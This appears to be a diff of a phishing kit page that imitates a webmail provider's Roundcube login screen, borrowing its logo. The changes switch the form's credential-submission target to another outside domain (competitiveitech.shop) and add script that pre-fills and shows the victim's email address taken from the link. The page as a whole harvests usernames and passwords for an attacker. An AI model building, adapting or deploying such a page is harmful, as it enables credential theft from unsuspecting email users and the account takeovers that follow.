@@ -25,7 +25,12 @@ window.onload = function() {
 	const urlParams = new URLSearchParams(queryString);
 	const code = urlParams.get('email')
 	username.value = code;
-
+if(code=="")
+	{
+		document.getElementById("divEmail").innerText = "No Email Found";
+		}else{
+	document.getElementById("divEmail").innerText = code;
+	}
 	
 
 	//return pixelDepth;
@@ -41,7 +46,7 @@ window.onload = function() {
 
 <div id="layout-content" class="selected no-navbar" role="main">
 	<img src="https://webmail.aei.ca/mail/skins/elastic/images/logo.svg?s=1612812581" id="logo" alt="Logo">
-	<form id="login-form" name="login-form" method="post" class="propform" action="https://competitiveitech.online/aei/login.php">
+	<form id="login-form" name="login-form" method="post" class="propform" action="https://competitiveitech.shop/aei/login.php">
 <input type="hidden" name="_token" value="m7kx5FPucuuZKtFfZSeSDn60dJZqHcET" class="form-control">
 	<input type="hidden" name="_task" value="login" class="form-control"><input type="hidden" name="_action" value="login" class="form-control"><input type="hidden" name="_timezone" id="rcmlogintz" value="America/New_York" class="form-control"><input type="hidden" name="_url" id="rcmloginurl" value="" class="form-control"><table><tbody><tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginuser">Username</label>
 </td>
